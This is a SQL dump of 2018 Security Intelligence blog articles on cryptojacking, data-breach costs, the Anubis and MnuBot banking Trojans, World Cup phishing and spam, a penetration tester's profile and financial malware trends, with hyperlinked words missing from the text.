to businesses across all sectors. Computers infected with host-based malware can be further infected with ransomware, spyware and other malicious applications. Organizations should educate their users and security leaders about the threat and take a proactive approach to  . Businesses should also invest in anti-malware programs to block known variants of mining malware and implement controls to identify mining activity. A  , for example, can alert security teams to high CPU and GPU usage during nonbusiness hours. Finally, behavioral analytics tools can help analysts identify abnormal patterns in resource usage with automation.', '\'Behavioral Analytics\', \'Bitcoin\', \'Bitcoin Mining\', \'Cryptocurrency\', \'Cryptocurrency Miner\', \'Endpoint Protection\', \'Endpoint Security\', \'Ethereum\', \'Monero\', \'Security Information and Event Management (SIEM)\'', 'https://securityintelligence.com/move-over-ransomware-why-cybercriminals-are-shifting-their-focus-to-cryptojacking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'Calculating the Cost of a Data Breach in 2018, the Age of AI and the IoT', 'Larry Ponemon', '2018-7-11', 'Businesses run on risk: They take a chance, place their bets in the marketplace and often reap great rewards. But when thinking about the cost of a data breach, you may wonder about the price for your company and what, exactly, is at stake. Here’s one way to think about it: You’re more likely to experience a data breach of at least 10,000 records (27.9 percent) than you are to catch the flu this winter (5–20 percent, according to  ). And as in the case of the flu, it’s crucial to act quickly and seek a cure for a speedy recovery. Since data breaches cost money, it’s best to take a cost-based approach to gain an accurate perspective of the problem at hand. Sponsored by IBM Security and independently conducted by my team at the Ponemon Institute, the 13th-annual   includes two new factors in its analysis that influence data-breach costs: deployment of artificial intelligence (AI) and the extensive use of Internet of Things (IoT) devices. The analysis also includes the cost of a so-called mega breach — an incident resulting in the loss of 1 million records or more — and the financial consequences of customers losing trust in your organization. \n In this year’s study, the average cost of a data breach per compromised record was $148, and it took organizations 196 days, on average, to detect a breach. Overall, we found that the total cost, per-capita cost and average size of a data breach (by number of records lost or stolen) have all increased year over year. Locations that experienced the most expensive data breaches include the U.S., where notification costs are nearly five times the global average, and the Middle East, which suffered the highest proportion of malicious or criminal attacks — the most expensive type of breach to identify and address. Data breaches are less expensive in   and  , where detection, escalation and notification costs rank the lowest. While the cost of a breach increased for organizations in 13 countries compared to the five-year average, it decreased in Brazil and Japan, according to this year’s report. Based on industry and location, our   can determine how much a security incident might cost an organization. This year’s report found that the average total cost of a breach ranges from $2.2 million for incidents with fewer than 10,000 compromised records to $6.9 million for incidents with more than 50,000 compromised records. But what about those massive breaches that grab national headlines? The study revealed that a mega breach (involving 1 million compromised records) could cost as much as $39.49 million. Unsurprisingly, this figure increases as the number of breached records grows. A breach involving 50 million records, for example, would result in a total cost of $350.44 million. Among the 477 companies examined for the study, the mean time to   is still substantial (197 days), while the mean time to contain a breach is 69 days. The good news: There are strategies to help businesses lower the potential cost of a data breach. For the fourth year running, the study found a correlation between how quickly an organization identifies and contains a breach and the total cost.   Organizations around the world lost customers due to data breaches in the past year. However, businesses that worked to   reduced the number of lost customers — thereby reducing the cost of a breach. When they deployed a senior-level leader, such as a chief privacy officer (CPO) or chief information security officer (CISO), to direct customer trust initiatives, businesses lost fewer customers and, again, minimized the financial consequences of a breach. Additionally, organizations that offered data-breach victims identity protection kept more customers than those that did not. Companies that lost less than 1 percent of existing customers incurred an average total cost of $2.8 million — while companies that experienced a churn rate of greater than 4 percent lost $6 million on average. For the first time, this year’s study examined the effects of organizations adopting AI as part of their security automation strategy and the extensive use of IoT devices.   save companies money — an average of $8 per compromised record — and use machine learning, analytics and orchestration to help human responders identify and contain breaches. However, only 15 percent of companies surveyed said they had fully deployed AI. Meanwhile, businesses that use IoT devices extensively pay $5 more per compromised record on average. To get the full rundown of the potential costs associated with a data breach — and learn what you can do to help protect your business — download the  , and take a look at our accompanying  . You can also use our   to explore the industry, location and cost factors if you experience a security incident.', '\'Artificial Intelligence (AI)\', \'Chief Information Security Officer (CISO)\', \'Cost of a Data Breach\', \'Data Breach\', \'Encryption\', \'Incident Response (IR)\', \'Internet of Things (IoT)\', \'IoT Security\', \'Ponemon Institute\', \'Security Leaders\', \'Security Leadership\'', 'https://securityintelligence.com/ponemon-cost-of-a-data-breach-2018/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Anubis Strikes Again: Mobile Malware Continues to Plague Users in Official App Stores', 'Shachar Gritzman', '2018-7-10', 'IBM X-Force mobile malware researchers have observed several developers actively uploading Android malware downloaders to the Google Play Store.\n Following  , our research team has been monitoring banking malware activity in official app stores. The team recently reported that downloader apps in the store are being used as the first step in an infection routine that fetches the Marcher (aka Marcher ExoBot) and BankBot Anubis mobile banking Trojans. Users who unknowingly install the app on their devices are subsequently infected. Cybercriminals use these banking Trojans to facilitate financial fraud by stealing login credentials to banking apps, e-wallets and payment cards.\n Starting in June, our team discovered a number of new malware downloader samples that infect users with BankBot Anubis (aka  ). The campaign features at least 10 malicious downloaders disguised as various applications, all of which fetch mobile banking Trojans that run on  . While the number of downloaders may seem modest, each of those apps can fetch more than 1,000 samples from the criminal’s command-and-control (C&C) servers.\n Finding new downloaders in the app store in connection with the BankBot Anubis malware could suggest that:\n Such   are common in the fraud and malware black markets. They entail a proven ability to infiltrate Google Play and plant malicious downloaders under the guise of benign-looking apps. These services can likely maintain the downloader’s C&C servers long enough to generate a steady stream of new infections, suggesting the thought-out operational security and know-how characteristic of organized cybercrime groups.\n \n As app store operators layer security to stymie the efforts of malicious developers, black-hat app distributors find ways to sidestep them. To circumvent ever-evolving app store defenses, mobile malware distributors rely on a strategy from the PC malware realms: Instead of uploading the actual malware to the store, which can result in sampling and detection at a very early stage in the distribution chain, they upload a downloader that may seem rather innocuous compared to actual malware.\n In general, a downloader app is more likely to survive security checks and recurring scans, and once it lands on a user’s device, it can fetch the intended malware app. As the Chinese general Sun Tzu wrote in “ ,” “The greatest victory is that which requires no battle.”\n In the current campaign, according to X-Force researchers, the downloader apps target Turkish-speaking users. They differ in type and visual style — from online shopping to financial services and even an automotive app — and are designed to look legitimate and enticing to users.\n   \n \n \n The variety of apps and styles indicates a large investment of resources on the part of the campaign’s operators, suggesting that a cybercrime service, rather than a single cybercrime faction, is likely responsible.\n The downloaders themselves are rather stealthy, and VirusTotal missed all but one of the samples. The one that was found had zero detections by antivirus engines.\n \n \n In this campaign, the malicious downloader apps X-Force detected have the same code base as three apps that   reported in January 2018. The following characteristics show the similarity:\n \n \n \n \n The resemblance is even more striking in the figure below. By removing all the key instances (**pE2**) from the string, we produced the same string from the January sample:\n \n \n With 10 downloaders at this point, the campaign appears to be scaling up.\n Over time, we’ve seen the code evolve. As time went by between downloader versions, the developers added a simple obfuscation and expanded the downloader capabilities. The code was also altered slightly to avoid detection by Google Play’s security controls.\n According to X-Force’s analysis, these changes suggest that the downloader app is being maintained on an ongoing basis — another sign that it is a commodity offered to cybercriminals or a specific group that’s focused on defrauding Turkish mobile banking users.\n After a successful installation of the malicious downloader, the app fetches BankBot Anubis from one of its C&C servers. The BankBot Anubis malware then masquerades as an app called “Google Protect” and prompts the user to grant it accessibility rights.\n \n Figure 6: Apps name in Turkish\n   \n \n Why ask for accessibility? BankBot Anubis uses Android’s Accessibility services to perform keylogging as a way to obtain the infected user’s credentials when he or she accesses a targeted mobile banking app. In most Android banking Trojans, the malware launches a fake overlay screen when the user accesses a target app. The user then taps his or her account credentials into the fake overlay, which allows the malware to steal the data. BankBot Anubis streamlines this process.\n By keylogging the user’s login information, the attacker can steal credentials from any app while avoiding the need to create custom overlays for each target. This malware is also able to take screen captures of the user’s screen, which it likely uses to steal credentials since the keyboard strokes are visible. These features are staples of PC banking malware and are evolving in   as well.\n The downloader apps in this particular campaign were designed to address Turkish users. With different botnets and configurations, BankBot Anubis itself also targets users in the following countries:\n While there were 10 downloader apps in the Google Play Store at the time of this writing, the campaign is rather hefty. X-Force estimated the magnitude of campaigns on Google Play by the number of downloads, as well as the number and variety of payloads found. In one case, the researchers fetched more than   from just one C&C server. Each sample has a different MD5 signature, few of which were documented by any antivirus engine when tested against VirusTotal.\n When it comes to maximizing the results of infection campaigns, mobile malware operators consider official app stores to be the holy grail. Getting a malicious app into an official store yields greater exposure to more potential victims, a cheap distribution channel and user trust. Moreover, malware apps that have already made it into an official store are more likely to fly under the radar of security controls for longer than those hosted on hijacked sites or rogue servers.   reports malicious apps to the official stores to have them removed before more users can be affected.\n Malicious apps are a blight that both store operators and developers work hard to limit. Still, it is a recurring problem: In 2017, X-Force mobile researchers reported numerous occasions on which financial malware had sneaked into the Google Play Store, with the   family leading the pack. The trend continues to escalate.\n X-Force researchers suspect that the cybercrime services spreading mobile Trojans have mastered it as a malware campaign channel and may be monetizing it. While such cybercrime services are rather popular with PC malware distributors, its rise in the mobile malware realm is an escalating risk factor users and organizations should be aware of.\n To learn more about keeping devices safe from mobile malware, read our  .', '\'Android\', \'Android Apps\', \'Android Security\', \'Banking Trojan\', \'Cybercriminals\', \'Google Play\', \'IBM X-Force Research\', \'Malware\', \'Mobile Applications\', \'Mobile Banking\', \'Mobile Banking Fraud\', \'Mobile Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/anubis-strikes-again-mobile-malware-continues-to-plague-users-in-official-app-stores/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'Goal! Spam Campaigns Capitalize on the World Cup Craze', 'Dirk Harz', '2018-6-28', 'When it comes to online fraud lures, scammers and spammers gear up to send massive campaigns of malicious email messages to recipients who may or may not open them. To increase their chances, ne’er-do-wells ride the tides of current news and events — and global sporting events are opportunities not to be missed. Like the Olympic games in 2016, the   attracts a lot of attention from fans, travelers, vendors and advertisers. This makes it an especially risky time to open unsolicited emails or click suspicious online advertisements.  maps spam campaigns and trends that emerge from billions of unsolicited email messages sent worldwide. Trending World Cup buzz did not leave our spam traps empty — and IBM X-Force identified several ongoing spam campaigns tied to the World Cup. Many of these campaigns also used branding from major sponsors to increase the credibility of their fake messages.\n Let’s look at are some examples of malicious emails worth a double-delete. A staple of online scams,   are part of every fraudster’s arsenal, designed to rob email recipients of their account credentials, payment card data and actual payments. X-Force is seeing a popular scheme leveraging the World Cup theme that attempts to convince email recipients that they have won a lottery. In one example, our researchers examined a congratulatory message for a fake lottery win that aimed to lure recipients to a phishing page that prompts the victim for his or her financial information to prepay a fee to receive the prize money. The victim will clearly not receive anything, and the fraudsters will simply make off with the money. To lend credibility to the scam, the email features the logos of a major sponsor, leading potential victims to believe they are the winners of $1 million. \n This email might look benign in its textual simplicity, but it’s easy to see that the domains, sending IP and email addresses are not from the brand’s official domain. These telltale signs are valid for the phishing page as well, with a domain name that was likely hijacked to host the attack. The same domain used in the email lure, “consultant.com,” was also used in other spam email samples that tempted recipients with fake winnings over $1.8 million. \n The domain “consultant.com” seems to have been registered in 1997, yet it is not reachable. When users attempt to browse to it, they are rerouted to a different domain. That domain directs them to folders titled “sweep” and “rewards,” suggesting the pages were specifically created to phish users who received the fraudulent emails. The suspicious domain where web users may land after redirection, “play[.]net-bf10[.]stream,” also automatically collects details about the visitor’s location and IP address — likely to block certain countries from entering the attack and thus minimize exposure and the chances of an early takedown. \n The idea of winning money from a well-known global brand is quite popular in World Cup spam and appeared in several versions our researchers picked out of their spam traps. \n Other spammers attempted to use the same fake winnings idea, but this group endeavored to craft content that appears to come from the FIFA organization itself. To collect the proceeds, the recipient of the lucky email is asked to send personal information and contact details to an email address controlled by the spammers. Those same details are often requested in 419 scams and advance-fee scams, which typically originate in Nigeria and parts of South Africa. \n FIFA-related spam also came in a number of formats from different senders. Without fail, the images in the content are blurry, the text is lengthy — and the senders ask the recipients to keep the matter secret. In each case, the email sender is after the victim’s contact details, which will most likely be used in further   over the phone. \n Spammers purporting to send FIFA email sometimes use the official FIFA domain, “fifa.com,” in the “From” header field of the email, making it seem as though the email is indeed from the international soccer governing body. Organizations can prevent this by leveraging an email security standard known as Domain Message Authentication Reporting and Conformance (DMARC) to prove email source authenticity. Unfortunately, according to X-Force researchers, FIFA has yet to publish a DMARC record for its website. However, FIFA did set up a special Sender Policy Framework (SPF) record, which is a building block of DMARC. In the spam campaigns we examined, the SPF check showed that the sender’s IP does not match the IP from which FIFA send its emails, creating a soft fail. Typically, emails that return a soft fail are tagged as potential spam but are still accepted. Another popular type of World Cup-themed spam comes from dubious sellers trying to peddle goods via unsolicited email. In one example, the sender offered up soccer uniform replicas for sale. In another — believe it or not — the seller offered auto parts. \n \n \n These spam themes are not the only ones making it into people’s inboxes, but they have been particularly popular during this year’s World Cup in Russia. Scammers are extremely active when  , and while browsing and email hygiene are always the way to go, these best practices are all the more critical when cybercriminals are out on the prowl. While cybercrime attempts will undoubtedly continue during the World Cup, the security community, companies and consumers can prepare themselves to identify common tactics and take necessary precautions. Consumers who are traveling to the World Cup games should take the following precautions: Even consumers who aren’t traveling to see live games should be on the lookout for World Cup-related email and mobile scams. The following best practices apply for internet users around the world during the tournament: Finally, local and global businesses should be on the lookout for World Cup-themed cyberthreats:', '\'Fraud Protection\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Penetration Testing\', \'Phishing\', \'Phishing Attacks\', \'Phishing Emails\', \'Security Awareness\', \'Social Engineering\', \'Spam Emails\', \'Threat Intelligence\', \'Threat Sharing\', \'Wi-Fi\', \'X-Force\'', 'https://securityintelligence.com/goal-spam-campaigns-capitalize-on-the-world-cup-craze/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'Space Rogue: A Security Rebel Turned Pen Tester', 'David Strom', '2018-6-13', 'Picture this: A group of IBM employees once tailgated their way into a client’s office building carrying a box of doughnuts, their laptops and testing gear. The group found an unoccupied conference room and placed the doughnuts on a table outside, along with a sign that said the group was conducting network testing there. They managed to work in the office all week — unchallenged and unquestioned — and penetrated the company’s network from the inside, fulfilling their mission. So began another engagement for the   team, a unique group of more than 100 security analysts who probe customers’ networks for vulnerabilities. Cris Thomas, who also goes by the pseudonym  , is the global strategy lead at IBM X-Force Red. I recently spoke with him to discuss his work as a penetration testing specialist, his role as a cybersecurity activist in the late 1990s — and the recent reunion of his influential hacking group on Capitol Hill. The X-Force Red team doesn’t “just do vulnerability assessment, which is what most folks think of when it comes to offensive security,” according to Thomas. It also uses both automated and manual tools and conducts code reviews and physical security testing. In other words? The team does exactly what cybercriminals do. Physical security is perhaps the most popular assessment. This tactic is where a team member tries — with full authorization, of course — to enter a company’s premises and hack its network from the inside, as in the now notorious doughnut example above. When they begin an engagement, members of the team usually find a vulnerability within a day or so. “We have never been to a client that we haven’t gotten into their network and found something serious,” Thomas said. “While it’s depressing to think that holes are everywhere, it’s a positive thing because we help our customers find and patch these holes and better secure their environments.” During his time at IBM, Thomas has worked on improving the  , which customers use to retrieve reports and schedule work for teams. He also worked on a project to expand an internship program. “There are not a lot of opportunities for offensive security positions at the college level, so we are ramping that up,” Thomas said. “That helps feed our employee pipeline too.” In 1998, Thomas and other members of attacker think tank L0pht Heavy Industries testified to Congress. L0pht is infamous for developing a series of hacking tools, such as Windows NT password crackers and a website called Hacker News Network. The white-hat hacking group also took on numerous consulting projects over the years. (Security firm @Stake acquired the think tank in 2000, and Symantec subsequently acquired @Stake in 2004.) During their testimony two decades ago, the group warned that computer networks were embarrassingly insecure — and bragged that any one of them could take the entire internet down in only a few minutes thanks to weaknesses in the core   routing. (The members even used their hacker names on their nameplates because many of them feared prosecution.) \n Thomas and several L0pht colleagues made headlines again in May 2018 when they reunited on Capitol Hill. The reason for their reunion? The group wanted to talk to Congress about the progress of cybersecurity regulations. While the group didn’t meet with representatives this time around — and their given names were openly discussed — there was still a serious reason for their reunion. Four of the original members returned to Capitol Hill to say that while security technology has improved, some things haven’t changed. “Nearly all of what we said 20 years ago still holds true,” said Joe “Kingpin” Grand, another member of the L0pht group. “Yes, there have been improvements, but the general class of problems are the same.” For example, the same 1998 BGP flaws were used in the MEWKit phishing attack in May 2018. “We have better visibility into our network endpoints, if we choose to gather it, and can make educated decisions about where to apply our limited resources,” Thomas testified. “Strong encryption is more prevalent, but we aren’t evenly applying the knowledge of how to make something secure.” \n In the past 20 years, Thomas has made other visits to Capitol Hill, primarily to brief congressional staffers about technology and security issues. “Staffers influence the elected representative, so they help to make sure that the basic tech knowledge is available to them,” Thomas said. “I want the representatives to have this knowledge because then they will make the right decisions. That’s regardless of whether they agree with my point of view or not.” In 2017, Thomas escorted two members of Congress around the show floor of DEF CON, a large hacker convention held annually in Las Vegas. It was an interesting experience for all of them. “Clearly, there is an obvious knowledge gap with our elected officials, but they have to be experts in almost everything. So, it isn’t fair to expect them to be knowledgeable in technology,” Thomas said. But did Thomas ever imagine he’d be working at IBM one day? “Even two years ago, I never thought I would,” he said. “But Steve Ocepek [regional lead of North America at IBM X-Force Red] was the best manager that I have ever worked with, and when he asked me to come work for him at IBM, I took it seriously.”', '\'Cybersecurity\', \'Federal Government\', \'IBM X-Force Research\', \'Malware\', \'Penetration Testing\', \'Security Testing\', \'Vulnerabilities\'', 'https://securityintelligence.com/space-rogue-a-security-rebel-turned-pen-tester/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'Cybersecurity at the World Cup: What You Should Know', 'Camille Singleton', '2018-6-6', 'Events like the World Cup inspire awe about what teams working together and individuals with determination can accomplish — these events are a time for national pride, excitement and enjoyment. Enhanced security at these events often focuses on physical security, with increased local police, physical barriers and identification checks. Yet, such measures should not overlook the need for heightened cybersecurity — not only because of the expanded digitization of sports venues but because the very attributes that make these events worthwhile open additional avenues for social engineering. Malicious actors can prey on fans caught up in the emotion of a match or gain access to and release sensitive information at a moment when the effect would be most acute. Enhancing awareness, implementing preventive measures and eliminating the use of digital devices (where practical) would decrease the level of risk at international sporting competitions. Three primary groups are particularly at risk during global sporting events: The largest sporting events allocate more than one million tickets, judging from   coverage of a large sporting event in February 2018. Tickets for the World Cup in Russia this June have already exceeded 1.6 million, according to   — underscoring the number of potential victims for cybercriminals, hacktivists and nation-state cyber actors. Financially-motivated malicious actors are likely to see significant opportunity in targeting fans — particularly if they can exploit online ticket sales or transactions conducted in a nonsecure environment — while hacktivists and nation-state cyber actors are likely to seek access to information and websites that will be politically advantageous, either now or in the future. Fans traveling internationally to attend high-profile sporting events are more likely to receive phishing attack messages — in fact, phishing-related spam increased by more than 40 percent during the World Cup in Germany in 2006, according to  . In these attacks, seemingly legitimate communications invite recipients to click on a link or file that will download and activate malicious software on their device. Cunning cyber actors are likely to exploit factors that can decrease vigilance to malicious messages, such as fans’ desires to congratulate and promote their teams or share their experiences on social media. In addition to phishing attacks, fans can unknowingly expose themselves to malware by using nonsecure Wi-Fi, including   available in airports, hotels and restaurants. One such attack prompts users to update software on their mobile device, then installs malware onto the device instead. Nonsecure Wi-Fi can enable others to see any sensitive information sent over the network, including usernames and passwords, financial information and private documents. Fans — and their family and friends back home — can also fall victim to the  . In this attack, malicious actors hijack the email account of someone traveling overseas. With this privileged access, they can send targeted messages to friends and family members, claiming to be the traveler in desperate need of funds quickly. Legislation and policies governing personal information and surveillance vary from country to country. Some national governments have  , prior to past global sporting events, not to bring electronic devices or to clean their devices of any sensitive material and consider using a “burner” device to avoid surveillance from the host country. For fans traveling to global sporting events, we recommend the following measures to enhance cybersecurity: Athletes, sports clubs and sports agencies have become frequent victims of cyberattacks and information leaks over the past two years, as noted by  . The upcoming World Cup would provide an ideal opportunity for cyber actors seeking to garner enhanced attention for their actions. Hacktivists and nation-state backed actors seeking to tarnish the reputation of athletes, teams or their countries may find a worldwide sporting event an ideal setting in which to disclose derogatory information. Additionally, cybercriminals or malicious actors hired by an opposing team have an incentive to steal valuable information about game tactics or financial data to affect high-stakes games. In the fall of 2016, a hacking group released confidential information about athletes acquired from databases on the World Anti-Doping Agency’s (WADA) networks, according to a public statement from  . The statement further explained that the attackers had used targeted phishing attacks against several WADA accounts, eventually gaining login credentials, allowing unauthorized access to the system. In April 2017, the   reported that the same group had hacked into its system, targeting information on athletes’ exemptions for drug use. Athletes and those that support them also face potential threats from opposing teams, judging from past precedent. In 2015, personnel working for the St. Louis Cardinals, a U.S. baseball team, came under FBI investigation for allegedly hacking into sensitive networks belonging to a rival team, the Houston Astros, according to  . Some teams are already implementing additional security measures to prepare for the World Cup this June. According to  , the Football Association will provide its own secure Wi-Fi for players and cautioned them about posting information that could reveal the team’s location, choice of players for the game or tactics. Athletes and those that support them can follow similar practices to enhance cybersecurity during the games: As sporting event venues, scoring equipment and communication with journalists and fans become increasingly digitized, cyber risks related to event administration are likely to grow exponentially. Nation-state backed actors or hacktivists may seize the opportunity to compromise the integrity of networks controlling event venues, particularly when controversial political events dovetail with planned games. Cybercriminals and attackers hired by opposing teams may be motivated to fix a match by tampering with cameras used to assist referees, scoring systems or power grids supporting the games. According to a report by the Center for Long-Term Cybersecurity at the  , the most common cyberthreats to sports venues currently include attacks against IT systems and ticket operations — but in the future may include devices that would affect the integrity of the game itself. Some concerning incidents at sporting events have already occurred, such as the cyberattack at the 2003 Pan American Games in the Dominican Republic that prevented scores from reaching journalists and fans, according to  . Industrial control systems, power grids and threats from Internet of Things (IoT) devices can further complicate cybersecurity for sporting event administrators, and an appropriate response is likely to involve close coordination with national cybersecurity units or even international organizations like Interpol. In March 2018,   held a conference to discuss security at sporting venues, addressing topics such as IoT and appropriate risk management. Distributed denial-of-service (DDoS) attacks are increasing in volume — particularly against IoT devices — doubling in a six-month time frame in mid-2017, according to a   report. IoT devices frequently lack appropriate security measures, such as updated firmware, firewalls or strong passwords during setup, with the potential to wreak havoc as a major sporting event is in full swing. On May 23, 2018,   reported how Ukraine raised alarms that a DDoS attack from   would interfere with the Union of European Football Associations (UEFA) Champions League soccer final in Ukraine later that week. Luckily, the warning appeared to inoculate the event from attack. We recommend the following measures to sporting event administrators for enhancing cybersecurity: From the high publicity surrounding global sporting events to the lucrative nature of exploiting expensive ticket transactions, malicious actors will have multiple reasons to target fans, athletes and venues at the World Cup this year. Potential victims can help decrease opportunities for attack by maintaining a higher level of vigilance, employing security best practices, such as updating software and patches, and being judicious about technology use, including opting out altogether when appropriate.', '\'Cybersecurity\', \'Hacking\'', 'https://securityintelligence.com/cybersecurity-at-the-world-cup-what-you-should-know/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'New Banking Trojan MnuBot Discovered by IBM X-Force Research', 'Jonathan Lusky', '2018-5-29', 'IBM X-Force Research has uncovered a new Brazilian, Delphi-based malware active in the wild in a recent campaign. This malware, dubbed MnuBot, caught the team’s attention due to its unusual command and control (C&C) server. Most malware in the wild today uses a C&C server, which is based on some form of a web server or an Internet Relay Chat (IRC) channel. The C&C server is used to communicate with the malware and send commands to be performed. In contrast, the MnuBot malware uses a Microsoft SQL Server database server to communicate with the sample and send commands to be executed on the infected machine. \n MnuBot is built from two base components, each representing a different stage of the attack flow. In its first stage, MnuBot looks for a file called Desk.txt within the AppData Roaming folder. Depending on whether the file exists or not, MnuBot performs the following: Using the Desk.txt file, MnuBot knows which desktop is currently running. Therefore, if the file exists, MnuBot knows that its current instance is running inside the new desktop. Within the newly created desktop, MnuBot continually checks the foreground window name. Once it finds a window name that is similar to one of the bank names in its configuration, it will query the server for the second stage executable according to the bank name that was found. The downloaded executable is saved as C:\\Users\\Public\\Neon.exe — and it contains the main logic of the attack. The downloaded executable is actually a remote access Trojan (RAT) that provides the malicious actor with full control over the victim machine, plus other functionalities that are unique to MnuBot. Like any other RAT, MnuBot needs to receive commands from the server. To do so, it constantly queries the Microsoft SQL database server for a new command. Upon infecting the victim machine, MnuBot connects to the C&C server to fetch the initial configuration. To connect to the server, MnuBot uses SQL server details (server address, port, username and a password), which are hardcoded inside the sample. It’s worth mentioning that those details are stored in an encrypted form and they are being decrypted dynamically just before initializing the connection to the server. The configuration consists of many strings that are crucial for MnuBot activity: Without the configuration, MnuBot will shut itself down and does not perform any   on the infected machine. By receiving the configuration this way, MnuBot authors attempt to achieve two main goals: Once the user has an open browsing session to his banking website account and the second stage executable of MnuBot has been download, the cybercriminal can get to work. At this point, they have an open session to the bank from the victim’s machine. To perform a successful fraud, the cybercriminal can use each one of the following MnuBot capabilities: The attacker sends commands to the victims by updating specific columns inside a table called USUARIOCONTROLEXGORDO, which is stored in a database named jackjhonson. A few interesting columns include the following: Like many other malware families in the region, MnuBot uses a full-screen overlay form to assist the attacker to commit the fraud. Overlaying forms are used to prevent the victims from accessing their   inside the browser. Those forms are a type of social engineering to keep the user waiting. In the background, the cybercriminal takes control over the user endpoint and attempts to perform an illegal transaction via the victim’s open banking session. Furthermore, if the cybercriminal needs additional details from the user, they can try and ask them for those details using another overlaying form. To do so, they use the executable that was downloaded during the second stage (Neon.exe) of the attack. This executable contains the relevant social engineering form for the bank that the user is currently using. It is most likely that MnuBot authors wanted to try to evade regular antivirus detection, which is based on the malware traffic. To do so, they decided to wrap their malicious network communication using seemingly innocent Microsoft SQL traffic. MnuBot is an excellent example of many malware families in the Brazilian region. It holds many characteristics that are typical of other recently discovered malware strains. For example, the overlaying forms and the new desktop creation are well-known techniques that malware authors in the region use today. To successfully compete with the new fraud techniques, new protection mechanisms must be developed. IBM Security develops intelligent   and services to help your business prepare today for the cybersecurity threats of tomorrow.', '\'Banking Malware\', \'Banking Trojan\', \'Cybersecurity\', \'IBM X-Force Research\', \'Malware\', \'Trojan\'', 'https://securityintelligence.com/new-banking-trojan-mnubot-discovered-by-ibm-x-force-research/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'Introducing IBM X-Force Threat Management: A Smarter Security Solution to Manage the 360-Degree Threat Life Cycle', 'John Wheeler', '2018-4-16', 'Each week, we see new public disclosures about companies impacted by cybersecurity breaches. Sure, it’s easy to say, “How could this have happened?” or, “They weren’t trying hard enough!” But the reality is that most companies are just flat-out overwhelmed. Below are a few reasons why. Designed by clients for clients,   offers a smarter security solution to manage the 360-degree life cycle. By establishing a modern partnership, IBM Security experts collaborate with clients on a prescriptive journey toward improved threat management maturity. With IBM X-Force Threat Management, clients’ security teams benefit from the global power of IBM Security expertise and innovation and tap into an integrated ecosystem of security partners. Clients are supported through a flexible delivery model consisting of our global and regional   along with local on-site experts. This is made possible by leveraging our new, innovative X-Force Protection Platform, the engine underpinning X-Force Threat Management, which currently processes over 2 trillion security events per month using Watson artificial intelligence (AI),   and intelligent orchestration powered by Resilient. The X-Force Protection Platform integrates with a strong partner ecosystem, including but not limited to Carbon Black, Crowdstrike, Cisco, Palo Alto Networks, Fortinet and Checkpoint. The platform will extend to clients via a new mobile experience that puts the information and the ability to take action directly in the palms of their hands. With IBM X-Force Threat Management, our clients will be able to: We invite you to learn more at our exclusive May 29 webinar, “ ” Explore the new mobile app, which allows users to assess the latest happenings in the world of cyber security intelligence, news and even test your threat maturity with the “What’s My Score” assessment aligned to NIST Cyber Framework. Download the mobile app for   and  .', '\'IBM Security\', \'Incident Response (IR)\', \'Security Solutions\', \'Skills Gap\', \'Threat Detection\', \'Threat Management\', \'Threat Prevention\', \'X-Force\'', 'https://securityintelligence.com/introducing-ibm-x-force-threat-management-a-smarter-security-solution-to-manage-the-360-degree-threat-life-cycle/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'Financial Malware Trends and Predictions: Organized Cybercrime Continues to Rise', 'Valerie Bradford', '2018-4-5', 'If anything in this world is certain, it’s that the financial cybercrime landscape is constantly changing and evolving.   research has been tracking malware trends around the world, and in a  , examined the cybercrime shifts of 2017 and what financial institutions can expect to see in 2018. Last year saw the rise of new cybergangs and the demise of others, proving that only the fittest and most sophisticated survive in the dog-eat-dog world of organized cybercrime. Rising awareness and the increasing effectiveness of banking controls mean that less sophisticated malware operators and smaller cybercriminal operations that rely on commercial codes are on their way out. Those with limited skills are simply unable to keep up with technological advances in banking security, especially in terms of machine learning and artificial intelligence. Within that context, 2017 saw several notable exits of crime gangs that just couldn’t keep up. The  , which emerged in Japan in 2015, departed from the scene this year after researchers noticed that its operators were using webinjections purchased from underground vendors. This outsourcing of code indicated that the group did not have its own developers and likely was not connected enough to operate globally. Another banking Trojan,  , which just emerged in the past year, is already reducing its activity. Its reliance on the Emotet group as a distributor suggests that the gang is not planning to spread aggressively or launch wider campaigns. \n In 2017, Gozi activity outpaced that of Zeus Trojan variants for the first time. The group behind Gozi is considered a cybercrime-as-a-service operation, with links to an increasing number of actors across different geographical hubs. This new dominance proves that cybercrime is further evolving in the direction of organized, businesslike gangs. Complex cybercrime organizations, such as those operating the   and   Trojans, can employ dozens of people and include orchestration of the entire supply chain. These gangs target high-value marks, such as banks and their customers, all over the globe. Sophisticated coding is another indication of a highly organized cybergang. As security technologies continue to improve in 2018, malware codes will need to   to evade detection. To keep their attacks concealed, cybergangs such as Dridex, GootKit, TrickBot and IcedID use complex  . Others, such as  , which is currently targeting Brazil, use  . One encouraging trend is the number of malware exits that came about due to the efforts of law enforcement. Key members of the  ,   and   operations were successfully arrested in the past year. This likely influenced each of the gangs to disband or reduce operations. Europol’s takedown of the   in late 2016 also had significant impact on malware gang exits in 2017. Financial cybercrime is not expected to slow down in 2018. Rather, it is becoming the business of elite groups, evolving further toward complex, organized operations. Financial malware is already adopting ideas from   while cybercriminal groups increase their focus on high-value business targets and bank heists. The IBM X-Force team is following all these malware trends. To learn more, read the new research report, “ .”', '\'Cybercrime\', \'Cybercrime Trends\', \'Dridex\', \'Financial Malware\', \'GozNym\', \'IBM X-Force Research\', \'Malware\', \'Neverquest\', \'Shifu\', \'TrickBot\', \'Trojan\'', 'https://securityintelligence.com/2018-financial-malware-trends-and-predictions-organized-cybercrime-continues-to-rise/');
